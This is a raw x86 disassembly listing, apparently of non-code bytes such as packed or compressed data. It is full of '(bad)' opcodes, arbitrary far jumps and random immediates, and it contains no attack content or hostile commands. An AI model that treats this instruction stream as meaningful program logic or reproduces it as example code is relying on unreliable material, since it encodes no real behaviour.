  4185cd:	ror    edi,cl
  4185cf:	mov    esi,DWORD PTR [esi+0x38f1aa4e]
  4185d5:	ins    BYTE PTR es:[edi],dx
  4185d6:	popf   
  4185d7:	test   BYTE PTR [ebx+0x16],cl
  4185da:	mov    bl,BYTE PTR [ebp+0xb]
  4185dd:	mov    edx,0x52f5bafb
  4185e2:	aas    
  4185e3:	cs dec edi
  4185e5:	mov    ecx,DWORD PTR [edx]
  4185e7:	sub    al,al
  4185e9:	ror    BYTE PTR [esi+0x2b519221],cl
  4185ef:	cmp    eax,0x799184c
  4185f4:	mov    ds:0xae3da023,eax
  4185f9:	mov    eax,ds:0xc8a6871a
  4185fe:	jmp    0x4185b6
  418600:	mov    dl,0x44
  418602:	das    
  418603:	lock xor DWORD PTR [edx-0x3f],ebx
  418607:	lods   eax,DWORD PTR ds:[esi]
  418608:	bound  ebx,QWORD PTR [eax+0x2d]
  41860b:	nop
  41860c:	dec    esi
  41860d:	mov    esp,0x21e45aa1
  418612:	sub    al,BYTE PTR [eax-0x7fd47229]
  418618:	aaa    
  418619:	ins    DWORD PTR es:[edi],dx
  41861a:	test   BYTE PTR [eax-0x7f65c4b5],0x74
  418621:	inc    edx
  418622:	pop    eax
  418623:	cmp    ah,BYTE PTR [ebx-0x1c]
  418626:	sbb    eax,0x1f98beda
  41862b:	xchg   ebp,eax
  41862c:	dec    esi
  41862d:	add    DWORD PTR [eax-0x5cd314a8],ebp
  418633:	inc    edi
  418634:	mov    al,ds:0x4be0e450
  418639:	cwde   
  41863a:	cmp    DWORD PTR ds:0x3a8cde30,0x863662e5
  418644:	jmp    0x49813964
  418649:	and    al,ah
  41864b:	fiadd  DWORD PTR [ebx]
  41864d:	mov    edx,0x5f2af56e
  418652:	outs   dx,BYTE PTR ds:[esi]
  418653:	and    bl,cl
  418655:	mov    ch,0x97
  418657:	xlat   BYTE PTR ds:[ebx]
  418658:	mov    ah,0x5f
  41865a:	sbb    BYTE PTR [edi-0x733d855b],0x16
  418661:	test   BYTE PTR [esi],ch
  418663:	enter  0xa5c2,0x43
  418667:	imul   edi,DWORD PTR [edx+0x69],0x3
  41866b:	adc    cl,BYTE PTR [ebx-0xdc9a19e]
  418671:	and    BYTE PTR [edx-0x6ae8ec02],0x23
  418678:	adc    eax,0xe1341fed
  41867d:	inc    edx
  41867e:	test   ecx,ecx
  418680:	loopne 0x418642
  418682:	(bad)
  418686:	sbb    BYTE PTR [eax+0x5e5e139a],dh
  41868c:	addr16 inc ebp
  41868e:	mov    ebp,0xe2aca7bc
  418693:	(bad)  
  418694:	xchg   ebx,eax
  418695:	retf   
  418696:	push   edi
  418697:	pop    ss
  418698:	jb     0x4186c3
  41869a:	fwait
  41869b:	push   ss
  41869c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41869d:	cmc    
  41869e:	bound  esp,QWORD PTR [edi-0x32a5a17f]
  4186a4:	cmp    DWORD PTR [esi+esi*8-0x71],esp
  4186a8:	fsubr  QWORD PTR [edx-0xa]
  4186ab:	or     DWORD PTR [esi-0x62],eax
  4186ae:	and    DWORD PTR [ecx-0x2cf1bb54],esi
  4186b4:	jge    0x418729
  4186b6:	lahf   
  4186b7:	xchg   esi,eax
  4186b8:	(bad)  
  4186bb:	inc    eax
  4186bc:	rol    DWORD PTR [ebx-0x7ca9ec3],cl
  4186c2:	neg    BYTE PTR [edi+0x55b97fc9]
  4186c8:	jns    0x41872a
  4186ca:	cmp    al,0x14
  4186cd:	push   0xa5069910
  4186d2:	pop    ss
  4186d3:	jl     0x4186da
  4186d5:	cmc    
  4186d6:	fsubr  QWORD PTR [esi+0x3befadeb]
  4186dc:	sub    edi,esi
  4186de:	ret    
  4186df:	out    0x2c,eax
  4186e1:	xchg   ecx,eax
  4186e2:	imul   ecx,DWORD PTR [edi-0x13],0xffffffdd
  4186e6:	dec    BYTE PTR [ecx]
  4186e8:	mov    esp,0x44c10434
  4186ed:	popa   
  4186ee:	cld    
  4186ef:	add    ah,BYTE PTR [ecx]
  4186f1:	mov    edx,0xe134a1ee
  4186f6:	scas   al,BYTE PTR es:[edi]
  4186f7:	retf   
  4186f8:	xchg   edi,eax
  4186f9:	pop    es
  4186fa:	jmp    0xc9af:0xb563d0b7
  418701:	push   ds
  418702:	mov    ebp,0xcd16bbf2
  418707:	adc    al,0x35
  418709:	sbb    edi,DWORD PTR [edx+ecx*4]
  41870c:	or     ch,BYTE PTR [ecx+0x3afc84df]
  418712:	push   cs
  418713:	stc    
  418714:	push   ds
  418715:	sbb    DWORD PTR [esi],eax
  418717:	retf   
  418718:	mov    dh,0x0
  41871a:	popa   
  41871b:	gs xor al,0x2c
  41871e:	sub    edx,DWORD PTR [eax]
  418720:	lds    esi,FWORD PTR [ecx-0x45980eb6]
  418726:	cwde   
  418727:	outs   dx,DWORD PTR ds:[esi]
  418728:	jl     0x4186d6
  41872a:	popf   
  41872b:	clc    
  41872c:	mov    ebp,0x28b56e0
  418731:	nop
  418732:	sbb    ah,bl
  418734:	mov    BYTE PTR [esp+ebx*1-0x712b923c],dh
  41873b:	jecxz  0x41876f
  41873d:	jbe    0x4186cb
  41873f:	fld    QWORD PTR [edi-0x449e73d8]
  418745:	fcomp  QWORD PTR [eax+edi*1-0x2b756a0b]
  41874c:	xchg   esi,eax
  41874d:	inc    ebp
  41874e:	retf   
  41874f:	adc    al,0x80
  418751:	mov    DWORD PTR [ebx-0x3f269e79],edi
  418757:	sbb    eax,0x900c3aea
  41875c:	mov    bl,0xc1
  41875e:	and    eax,0x88911993
  418763:	mov    esp,0xadbda5a3
  418768:	add    cl,BYTE PTR [edi-0x46aa78a5]
  41876e:	sahf   
  41876f:	into   
  418770:	sahf   
  418771:	ret    
  418772:	adc    al,0x68
  418774:	aam    0xf1
  418776:	and    eax,esp
  418778:	cmp    bh,BYTE PTR [ecx-0x4b1d1f2c]
  41877e:	into   
  41877f:	(bad)  
  418780:	imul   ebx,DWORD PTR [edi],0xb73a9232
  418786:	or     eax,0xd344779a
  41878b:	jb     0x418753
  41878d:	pop    ecx
  41878e:	pop    ds
  41878f:	inc    edx
  418790:	xor    edi,ebx
  418792:	push   ebx
  418793:	and    eax,0xbcf589d6
  418798:	test   DWORD PTR [edx+0x7b],edi
  41879b:	shl    BYTE PTR [ebx+eiz*2+0x6f93255d],0x2e
  4187a3:	jecxz  0x41874b
  4187a5:	adc    bh,BYTE PTR [ebp+0x5cd21b12]
  4187ab:	js     0x418755
  4187ad:	mov    ds:0xa2707f03,eax
  4187b2:	inc    edx
  4187b3:	add    al,0x6d
  4187b5:	pop    esi
  4187b6:	sbb    DWORD PTR [ecx-0x594543db],eax
  4187bc:	mov    ebx,0xeda65f85
  4187c1:	add    eax,0xd8b65b4b
  4187c6:	jns    0x418815
  4187c8:	mov    esi,0x4f1b61a4
  4187cd:	jo     0x4187bf
  4187cf:	sbb    BYTE PTR [ebp+0x31b68e74],bh
  4187d5:	sbb    DWORD PTR ds:0x8ef21b3,esp
  4187db:	sbb    DWORD PTR [edi],esi
  4187dd:	push   0x5f427903
  4187e2:	jle    0x4187db
  4187e4:	xor    al,BYTE PTR [eax]
  4187e6:	pop    es
  4187e7:	mov    bh,0xe6
  4187e9:	popa   
  4187ea:	loope  0x4187bc
  4187ec:	mov    ecx,0xa2ffab90
  4187f1:	and    edx,esp
  4187f3:	jo     0x41886e
  4187f5:	xchg   edx,eax
  4187f6:	enter  0xbbf6,0x95
  4187fa:	sti    
  4187fb:	or     eax,DWORD PTR [edi+0x26eeb025]
  418801:	loop   0x4187db
  418803:	adc    al,0x2e
  418805:	adc    BYTE PTR [eax],dl
  418807:	jb     0x41887a
  418809:	pop    eax
  41880a:	lahf   
  41880b:	mov    ds:0x4cf355ab,al
  418810:	inc    edx
  418811:	push   ecx
  418812:	adc    eax,0x190985fe
  418817:	imul   ecx,DWORD PTR [ebx+ebp*1-0x56a038a3],0x6
  41881f:	mov    ?,WORD PTR [eax-0x67c6e9e3]
  418825:	inc    ebx
  418826:	pop    edi
  418827:	out    0x6e,al
  418829:	cmc    
  41882a:	(bad)  
  41882b:	xchg   edx,eax
  41882c:	popf   
  41882d:	test   dl,al
  41882f:	jo     0x4187b8
  418831:	ret    0xf173
  418834:	retf   0xc883
  418837:	aam    0xc1
  418839:	scas   al,BYTE PTR es:[edi]
  41883a:	sti    
  41883b:	mov    ch,0xb3
  41883d:	jge    0x418891
  41883f:	jns    0x4188ba
  418841:	ficomp DWORD PTR [edx-0x47]
  418844:	or     al,0x21
  418846:	push   0xcc6bdcb2
  41884b:	cmc    
  41884c:	xchg   esi,eax
  41884d:	loope  0x41881c
  41884f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418850:	bnd jle 0x4187fc
  418853:	lods   eax,DWORD PTR ds:[esi]
  418854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418855:	call   FWORD PTR [ebx+0x4da0569f]
  41885b:	(bad)  
  41885c:	and    eax,0x572aed7b
  418861:	sbb    ch,ch
  418863:	dec    esp
  418864:	out    0x76,eax
  418866:	xor    ebx,DWORD PTR [eax+edx*1-0x57]
  41886a:	daa    
  41886b:	loope  0x4188ca
  41886d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41886e:	inc    esi
  41886f:	sub    eax,0xab761d02
  418874:	daa    
  418875:	xchg   ebp,eax
  418876:	mov    al,ds:0x5922fe72
  41887b:	mov    esi,0xd7c68f32
  418880:	cwde   
  418881:	inc    ebx
  418882:	jmp    0x5e54:0x22220331
  418889:	jne    0x41881b
  41888b:	or     ecx,DWORD PTR [ecx+0x64d77ac4]
  418891:	mov    ds:0x10d0def8,al
  418896:	aad    0xf8
  418898:	cld    
  418899:	in     al,dx
  41889a:	xchg   ebp,eax
  41889b:	push   0xffffffe1
  41889d:	aaa    
  41889e:	push   ecx
  41889f:	loop   0x4188e6
  4188a1:	and    BYTE PTR [edi],dl
  4188a3:	arpl   WORD PTR [esi-0x635ea81b],dx
  4188a9:	mov    dl,0xce
  4188ab:	ss push esp
  4188ad:	or     eax,0xd8c1336b
  4188b2:	add    DWORD PTR ds:0x3d7adaeb,ebp
  4188b8:	push   edi
  4188b9:	xchg   ecx,eax
  4188ba:	mov    eax,ds:0x179dac81
  4188bf:	adc    al,0x83
  4188c1:	sbb    BYTE PTR [ebp-0x3405f761],0x4f
  4188c8:	push   0xffffffe2
  4188ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188cb:	xchg   edi,eax
  4188cc:	dec    eax
  4188cd:	stc    
  4188ce:	mov    dh,0x83
  4188d0:	sti    
  4188d1:	push   esi
  4188d2:	inc    edi
  4188d3:	iret   
  4188d4:	mov    cl,0xfb
  4188d6:	pop    es
  4188d7:	fnstsw WORD PTR ds:0xc0c39819
  4188dd:	xor    bh,BYTE PTR [ecx-0x7]
  4188e0:	inc    edx
  4188e1:	mov    bl,0x26
  4188e3:	xor    bh,bh
  4188e5:	add    esi,DWORD PTR [ecx-0x7d]
  4188e8:	lds    ebp,FWORD PTR [edx-0x67eaba5]
  4188ee:	stos   BYTE PTR es:[edi],al
  4188ef:	retf   
  4188f0:	mov    al,ds:0x5f150cea
  4188f5:	cmp    BYTE PTR ds:[ebx-0x74],0x40
  4188fa:	mov    BYTE PTR [ebx],dh
  4188fc:	imul   ebp,DWORD PTR [edx*2-0x2c810ea3],0xffffffe4
  418904:	jg     0x41889a
  418906:	jg     0x418957
  418908:	jmp    0x81fa854f
  41890d:	jge    0x418922
  41890f:	(bad)  
  418910:	scas   al,BYTE PTR es:[edi]
  418911:	test   BYTE PTR [edi+0x7d],dl
  418914:	mov    dh,0x54
  418916:	jne    0x418907
  418918:	enter  0xcea5,0x43
  41891c:	jl     0x41898a
  41891e:	or     DWORD PTR [edx],edi
  418920:	mov    bh,0x65
  418922:	xchg   edi,eax
  418923:	ja     0x5ec2d4d7
  418929:	fdivr  st,st(6)
  41892b:	sti    
  41892c:	dec    esi
  41892d:	push   ebx
  41892e:	mov    eax,0x7248a637
  418933:	call   0xb980:0xcc861008
  41893a:	aad    0x74
  41893c:	scas   eax,DWORD PTR es:[edi]
  41893d:	cmp    eax,0x61437f5
  418942:	aam    0x95
  418944:	scas   eax,DWORD PTR es:[edi]
  418945:	test   BYTE PTR [ebx],al
  418947:	pop    ebx
  418948:	jnp    0x4189a3
  41894a:	push   ebx
  41894b:	imul   esi,DWORD PTR [ebp-0xa],0x5f950270
  418952:	mov    al,BYTE PTR [esi-0x69]
  418955:	or     esi,ecx
  418957:	sahf   
  418958:	inc    eax
  418959:	gs inc ebx
  41895b:	shl    DWORD PTR [esi],0x36
  41895e:	fnstsw WORD PTR [edx]
  418960:	cwde   
  418961:	xchg   ebx,eax
  418962:	mov    eax,0xd10b6622
  418967:	outs   dx,DWORD PTR ds:[esi]
  418968:	loopne 0x4189d0
  41896a:	and    BYTE PTR [esi+0x75],0x1b
  41896e:	scas   al,BYTE PTR es:[edi]
  41896f:	fidiv  WORD PTR [eax]
  418971:	stos   BYTE PTR es:[edi],al
  418972:	jb     0x41895f
  418974:	into   
  418975:	les    ebx,FWORD PTR [ebp+ecx*4+0x1b]
  418979:	mov    ecx,fs
  41897b:	or     DWORD PTR [eax+ecx*4],0xffffffd8
  41897f:	sub    eax,0xb2054c1e
  418984:	push   ecx
  418985:	int3   
  418986:	mov    ds:0x828412c2,al
  41898b:	test   BYTE PTR [ecx+0x6e],dh
  41898e:	xchg   al,bh
  418990:	sbb    dl,bl
  418992:	lea    ecx,[ebp-0x3c]
  418995:	mov    esp,0xc57ad918
  41899a:	cs jp  0x418a1c
  41899d:	cdq    
  41899e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41899f:	cwde   
  4189a0:	int    0x95
  4189a2:	out    0x32,al
  4189a4:	jb     0x41892f
  4189a6:	jbe    0x4189b9
  4189a8:	scas   eax,DWORD PTR es:[edi]
  4189a9:	xor    eax,0x231d485b
  4189ae:	loop   0x41897f
  4189b0:	int3   
  4189b1:	pushf  
  4189b2:	pushf  
  4189b3:	adc    al,0x5
  4189b5:	cld    
  4189b6:	xor    BYTE PTR [esp+edi*4-0x2e51680f],cl
  4189bd:	adc    BYTE PTR [ecx+0xe501e76],ch
  4189c3:	mov    bh,0x50
  4189c5:	(bad)  
  4189c6:	pusha  
  4189c7:	inc    esi
  4189c8:	sbb    DWORD PTR [edi-0xe],ebx
  4189cb:	sub    cl,BYTE PTR [ecx-0x5817bd3c]
  4189d1:	aam    0x9c
  4189d3:	popa   
  4189d4:	inc    edi
  4189d5:	mov    WORD PTR [ecx-0x73d27c53],ss
  4189db:	dec    esi
  4189dc:	cwde   
  4189dd:	imul   ecx,eax,0xeec585a5
  4189e3:	test   DWORD PTR [edi+0x41],edx
  4189e6:	mov    esi,0x96851eb7
  4189eb:	in     al,dx
  4189ec:	push   edx
  4189ed:	dec    ebx
  4189ee:	hlt    
  4189ef:	and    BYTE PTR [ebp-0x1e38e9bb],bh
  4189f5:	fidiv  WORD PTR [edx-0x3a86ac79]
  4189fb:	stc    
  4189fc:	jb     0x4189e8
  4189fe:	xchg   edi,eax
  4189ff:	pop    esi
  418a00:	push   esi
  418a01:	test   al,0x73
  418a03:	pop    edx
  418a04:	dec    esp
  418a05:	add    ah,BYTE PTR fs:[eax+0x3e]
  418a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a0a:	test   BYTE PTR [esi],0x8b
  418a0d:	fstp   st(3)
  418a0f:	or     eax,0xc60c99fb
  418a14:	int3   
  418a15:	int3   
  418a16:	repz cmc 
  418a18:	and    ah,dl
  418a1a:	clc    
  418a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a1c:	clc    
  418a1d:	jnp    0x418a3d
  418a1f:	xchg   DWORD PTR [ecx],edx
  418a21:	push   edx
  418a22:	push   ss
  418a23:	rcl    BYTE PTR [edi+eax*8-0xd77ae3e],1
  418a2a:	mov    dh,0x96
  418a2c:	push   0xffffffab
  418a2e:	inc    esi
  418a2f:	cld    
  418a30:	add    ebp,DWORD PTR [esi]
  418a32:	add    BYTE PTR [ecx-0x4c98f6cf],ch
  418a38:	push   cs
  418a39:	rcl    DWORD PTR [ebp-0x42511dfe],1
  418a3f:	repz (bad) 
  418a41:	inc    ebx
  418a42:	xor    al,0x61
  418a44:	jmp    0x5721479c
  418a49:	sbb    al,0x87
  418a4b:	xor    ah,BYTE PTR [ebp+0x3565aed4]
  418a51:	or     BYTE PTR [edi+0x5a13972d],0xba
  418a58:	sbb    esi,DWORD PTR [eax-0x6590df37]
  418a5e:	fdiv   QWORD PTR [eax]
  418a60:	sub    edi,DWORD PTR [edx-0x61bf6523]
  418a66:	push   eax
  418a67:	loop   0x418a20
  418a69:	add    eax,0xb0a48ab9
  418a6e:	mov    DWORD PTR [edx*4+0x25fbd586],esp
  418a75:	add    DWORD PTR [edi+0x7a869a7e],esp
  418a7b:	pop    ebx
  418a7c:	cmc    
  418a7d:	hlt    
  418a7e:	or     eax,0x3cf0fc0f
  418a83:	nop
  418a84:	xchg   ecx,eax
  418a85:	aaa    
  418a86:	aas    
  418a87:	jle    0x418aa6
  418a89:	out    0x18,al
  418a8b:	rol    ebx,cl
  418a8d:	call   DWORD PTR [ebx+eax*4-0x65b283]
  418a94:	sar    BYTE PTR [ebx+edi*8],cl
  418a97:	add    edx,DWORD PTR [eax]
  418a99:	mov    ds:0xde633787,al
  418a9e:	mov    ah,0x3b
  418aa0:	or     DWORD PTR [ebp+0x7f4bb7fd],esp
  418aa6:	add    BYTE PTR [edx],0xe3
  418aa9:	cmp    esp,edx
  418aab:	jle    0x418ac8
  418aad:	in     al,dx
  418aae:	into   
  418aaf:	ficomp DWORD PTR [ecx-0x57]
  418ab2:	outs   dx,DWORD PTR ds:[esi]
  418ab3:	das    
  418ab4:	cmp    al,0x92
  418ab6:	xchg   edi,eax
  418ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ab8:	add    BYTE PTR [esi],ch
  418aba:	mov    dl,0x5d
  418abc:	xor    BYTE PTR [esi],ah
  418abe:	loopne 0x418a64
  418ac0:	(bad)  
  418ac1:	test   esp,esi
  418ac3:	cmc    
  418ac4:	xchg   edx,eax
  418ac5:	call   0x8e4e8ec1
  418aca:	(bad)  
  418acb:	mov    edi,0x1a40aff2
  418ad0:	dec    esi
  418ad1:	add    al,0xfb
  418ad3:	push   ecx
  418ad4:	outs   dx,BYTE PTR ds:[esi]
  418ad5:	test   BYTE PTR [ebp+0x6e8af4a9],bh
  418adb:	sbb    eax,0xdf0cc407
  418ae0:	and    ch,BYTE PTR [ebx]
  418ae2:	fidivr WORD PTR [edi]
  418ae4:	test   BYTE PTR [edi+0x74],al
  418ae7:	faddp  st(4),st
  418ae9:	pusha  
  418aea:	pop    ecx
  418aeb:	je     0x418ac0
  418aed:	addr16 cmp bl,ah
  418af0:	push   edi
  418af1:	pop    esp
  418af2:	jle    0x418b17
  418af4:	call   0x54f0:0x7c70152
  418afb:	fsubr  DWORD PTR [eax+0x752bbd2e]
  418b01:	ret    
  418b02:	(bad)  
  418b03:	icebp  
  418b04:	imul   ebp,DWORD PTR [eax-0x76],0xffffffd8
  418b08:	mov    dl,dl
  418b0a:	dec    edi
  418b0b:	sahf   
  418b0c:	pop    esp
  418b0d:	ss cmc 
  418b0f:	outs   dx,DWORD PTR ds:[esi]
  418b10:	xchg   edi,eax
  418b12:	jp     0x418b83
  418b14:	pop    ecx
  418b15:	sub    ah,al
  418b17:	popf   
  418b18:	leave  
  418b19:	push   eax
  418b1a:	and    ah,BYTE PTR ds:0x98bed35d
  418b20:	xor    al,0xe6
  418b22:	retf   0xebf8
  418b25:	fstp   DWORD PTR [eax+0x4f]
  418b28:	adc    eax,0x62d4219d
  418b2d:	scas   eax,DWORD PTR es:[edi]
  418b2e:	adc    eax,0x63102318
  418b33:	repz div DWORD PTR [ebp-0x4f]
  418b37:	xor    esp,DWORD PTR ds:0x8e08c9ea
  418b3d:	or     BYTE PTR [edx-0x3a50cb91],ch
  418b43:	aam    0x0
  418b45:	iret   
  418b46:	mov    ch,0x8d
  418b48:	call   0xf3ca8a2c
  418b4d:	not    BYTE PTR [edx]
  418b4f:	shl    DWORD PTR [ecx+0xe3bee8b],cl
  418b55:	dec    ecx
  418b56:	pop    ebp
  418b57:	cmp    al,BYTE PTR [ebx+0x5a]
  418b5a:	dec    esi
  418b5b:	iret   
  418b5c:	pop    edi
  418b5d:	push   0x20
  418b5f:	dec    ecx
  418b60:	add    esp,edi
  418b62:	cmp    eax,0x4a18589a
  418b67:	cld    
  418b68:	icebp  
  418b69:	push   ebx
  418b6a:	sbb    BYTE PTR [edi-0x41],dl
  418b6d:	jmp    0xc3a1:0xbd483b7
  418b74:	or     bh,BYTE PTR [ebx+0x73557ba8]
  418b7a:	sbb    cl,BYTE PTR [esi+0x11]
  418b7d:	inc    edi
  418b7e:	test   DWORD PTR [ecx+0x67a6123c],ecx
  418b84:	ins    DWORD PTR es:[edi],dx
  418b85:	stos   DWORD PTR es:[edi],eax
  418b86:	cmp    DWORD PTR [edx],ebp
  418b88:	mov    al,0x75
  418b8a:	dec    edx
  418b8b:	add    ch,BYTE PTR [edi]
  418b8d:	lock and eax,0xa0863e6e
  418b93:	test   DWORD PTR [ebx],edx
  418b95:	icebp  
  418b96:	in     al,dx
  418b97:	mov    eax,ds:0x9adcc646
  418b9c:	outs   dx,DWORD PTR ds:[esi]
  418b9d:	dec    esi
  418b9e:	pop    esp
  418b9f:	add    bh,BYTE PTR [esi]
  418ba1:	or     ebp,ebx
  418ba3:	pop    ecx
  418ba4:	outs   dx,BYTE PTR ds:[esi]
  418ba5:	xchg   DWORD PTR [ebx],ebx
  418ba7:	xchg   BYTE PTR [ebp-0x9],dh
  418baa:	test   ebx,ebp
  418bac:	rcr    BYTE PTR [si],1
  418baf:	inc    ecx
  418bb0:	add    al,0x95
  418bb2:	cwde   
  418bb3:	jbe    0x418b79
  418bb5:	call   0x816b:0x92cf8366
  418bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bbd:	shl    eax,0x1a
  418bc0:	sbb    DWORD PTR [eax-0x74],ebx
  418bc3:	mov    DWORD PTR [ecx],edx
  418bc5:	jns    0x418c1f
  418bc7:	mov    edi,0x8106dfba
  418bcc:	repz inc ebp
  418bce:	inc    ebx
  418bcf:	push   0x64367863
  418bd4:	fcom   QWORD PTR [edi+ebx*1]
  418bd7:	ret    
  418bd8:	int3   
  418bd9:	ss push ebx
  418bdb:	loop   0x418b68
  418bdd:	pop    esi
  418bde:	aas    
  418bdf:	mov    bh,0xbc
  418be1:	and    DWORD PTR [ebx+0x20],ebx
  418be4:	or     DWORD PTR [ebp-0x24],ecx
  418be7:	fdiv   QWORD PTR [ebx+0x42]
  418bea:	dec    edi
  418beb:	pop    ds
  418bec:	mov    dh,0x21
  418bee:	ror    BYTE PTR [esi+0x63],cl
  418bf1:	fcomp  QWORD PTR [esi]
  418bf3:	or     DWORD PTR [eax],ebx
  418bf5:	pusha  
  418bf6:	pop    ebp
  418bf7:	mov    bl,al
  418bf9:	adc    bh,bl
  418bfb:	mov    DWORD PTR gs:[eax+0x6541d181],ebp
  418c02:	lods   eax,DWORD PTR ds:[esi]
  418c03:	(bad)  
  418c05:	ja     0x418bd2
  418c07:	mov    ebx,0xa22bf1cf
  418c0c:	nop
  418c0d:	add    DWORD PTR [edi],edi
  418c0f:	js     0x418b9c
  418c11:	popa   
  418c12:	sbb    dl,0x98
  418c15:	adc    ebx,edi
  418c17:	and    ebp,edi
  418c19:	ss imul eax,ecx,0xffffff9c
  418c1d:	pop    edx
  418c1e:	pop    edx
  418c1f:	cmc    
  418c20:	sub    DWORD PTR [edx+0x60cb539f],0x57102d74
  418c2a:	pop    es
  418c2b:	dec    BYTE PTR ds:0x515cd854
  418c31:	pusha  
  418c32:	adc    al,dl
  418c34:	fld    DWORD PTR [eax+ebx*1+0xa]
  418c38:	xchg   cl,ch
  418c3a:	sbb    ch,dl
  418c3c:	test   DWORD PTR [edi],0x8aceedd9
  418c42:	xor    al,0x98
  418c44:	add    DWORD PTR [ebx+0x19],eax
  418c47:	shl    esi,0xc
  418c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c4b:	in     al,0xa5
  418c4d:	lods   eax,DWORD PTR ds:[esi]
  418c4e:	and    DWORD PTR ds:0x8b156447,ebp
  418c54:	arpl   WORD PTR [edx+0x63],ax
  418c57:	xchg   edx,eax
  418c58:	fwait
  418c59:	adc    BYTE PTR gs:[edi-0x38],cl
  418c5d:	fiadd  WORD PTR [esi]
  418c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c60:	cmp    DWORD PTR [ecx+ecx*4],0xffffffd5
  418c64:	or     al,0x77
  418c66:	xor    edx,ebx
  418c68:	adc    eax,0xc09d86df
  418c6d:	stc    
  418c6e:	leave  
  418c6f:	mov    esp,0xfe4f39ae
  418c74:	imul   edi,DWORD PTR [edi],0x8e99ef8f
  418c7a:	inc    edx
  418c7b:	add    eax,0xbeabc879
  418c80:	int3   
  418c81:	add    bh,BYTE PTR [ecx]
  418c83:	cmp    eax,0x609efd65
  418c88:	in     al,dx
  418c89:	sti    
  418c8a:	stc    
  418c8b:	ins    BYTE PTR es:[edi],dx
  418c8c:	bound  eax,QWORD PTR [ebx]
  418c8e:	cmp    eax,0x7d71f2e6
  418c93:	scas   al,BYTE PTR es:[edi]
  418c94:	push   ds
  418c95:	pop    eax
  418c96:	xor    BYTE PTR [ebx-0x43],bh
  418c99:	mov    ecx,0x25a33f44
  418c9e:	adc    BYTE PTR [esi],ch
  418ca0:	pop    ebp
  418ca1:	(bad)  
  418ca2:	sbb    dh,al
  418ca4:	lds    edi,FWORD PTR [esi]
  418ca6:	or     esp,DWORD PTR [eax+0x62cfc6d5]
  418cac:	inc    esi
  418cad:	loop   0x418c61
  418caf:	push   ds
  418cb0:	pop    edi
  418cb1:	pop    esp
  418cb2:	jb     0x418c8f
  418cb4:	mov    al,ss:0xba4db40d
  418cba:	out    0x66,eax
  418cbc:	dec    esi
  418cbd:	rol    ebx,1
  418cbf:	jae    0x418cfc
  418cc1:	rcl    DWORD PTR [ebx-0x18],cl
  418cc4:	fisubr WORD PTR [edx-0x36]
  418cc7:	sub    eax,0x414803f4
  418ccc:	pop    ss
  418ccd:	jno    0x418d05
  418ccf:	(bad)  
  418cd0:	fmul   QWORD PTR cs:[edx+0x54]
  418cd4:	fst    QWORD PTR [ecx]
  418cd6:	ficom  DWORD PTR [edi+ecx*8+0x70716855]
  418cdd:	pop    eax
  418cde:	cmp    DWORD PTR [ebx],eax
  418ce0:	pop    ecx
  418ce1:	ds xchg esp,eax
  418ce3:	add    BYTE PTR [edi],dh
  418ce5:	(bad)  [esi-0xb]
  418ce9:	js     0x418d63
  418ceb:	in     al,0x6c
  418ced:	stos   BYTE PTR es:[edi],al
  418cee:	xchg   edx,eax
  418cef:	jns    0x418c91
  418cf1:	nop
  418cf2:	inc    edx
  418cf3:	or     eax,0x8be00441
  418cf8:	adc    ecx,ebp
  418cfa:	cli    
  418cfb:	or     eax,edi
  418cfd:	gs jl  0x418c89
  418d00:	fadd   QWORD PTR [eax+edx*8]
  418d03:	push   ecx
  418d04:	mov    edi,0x23b0cd7b
  418d09:	shr    eax,0x96
  418d0c:	xor    bh,0xf9
  418d0f:	xor    eax,0xa6f17ac6
  418d14:	pop    ecx
  418d15:	mov    esi,0xe0f5ea14
  418d1a:	jo     0x418d68
  418d1c:	mov    ah,0x89
  418d1e:	inc    esi
  418d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d20:	cmp    al,0x41
  418d22:	std    
  418d23:	xchg   edi,eax
  418d24:	and    eax,0x5f658397
  418d29:	in     eax,0xcc
  418d2b:	scas   al,BYTE PTR es:[edi]
  418d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d2d:	outs   dx,BYTE PTR ds:[esi]
  418d2e:	push   eax
  418d2f:	xor    ebp,ecx
  418d31:	push   cs
  418d32:	push   ecx
  418d33:	daa    
  418d34:	inc    eax
  418d35:	cwde   
  418d36:	sbb    BYTE PTR [ebx+0x4f85ea6c],dl
  418d3c:	mov    ds:0xcbdd47d7,al
  418d41:	out    dx,eax
  418d42:	xor    DWORD PTR [edx-0x42],esi
  418d45:	mov    eax,0xed39a4fb
  418d4a:	stos   DWORD PTR es:[edi],eax
  418d4b:	cwde   
  418d4c:	inc    DWORD PTR [esi+edx*4]
  418d4f:	mov    DWORD PTR [edx+0x46e14c4f],esi
  418d55:	jmp    0x447c:0x69ef1792
  418d5c:	fwait
  418d5d:	adc    BYTE PTR [eax],0x38
  418d60:	dec    edx
  418d61:	or     eax,0x71fd4600
  418d66:	add    eax,0x11
  418d69:	retf   
  418d6a:	jb     0x418d84
  418d6c:	jo     0x418d5c
  418d6e:	pop    edx
  418d6f:	add    al,0x7c
  418d71:	test   eax,0x887d08de
  418d76:	mov    esp,?
  418d78:	ss stos DWORD PTR es:[edi],eax
  418d7a:	push   ebx
  418d7b:	mov    eax,ds:0xd64b7783
  418d80:	adc    al,0x85
  418d82:	test   BYTE PTR [esi+0x1ac7b523],bh
  418d88:	aad    0xfb
  418d8a:	(bad)  
  418d8b:	push   es
  418d8c:	rcr    BYTE PTR [ecx],cl
  418d8e:	(bad)  
  418d90:	test   BYTE PTR ds:0x770ab469,bh
  418d96:	jmp    0x418d90
  418d98:	je     0x418e0d
  418d9a:	mov    eax,ds:0x4d55d90d
  418d9f:	dec    esi
  418da0:	jbe    0x418d8a
  418da2:	in     eax,dx
  418da3:	mov    bl,0xa7
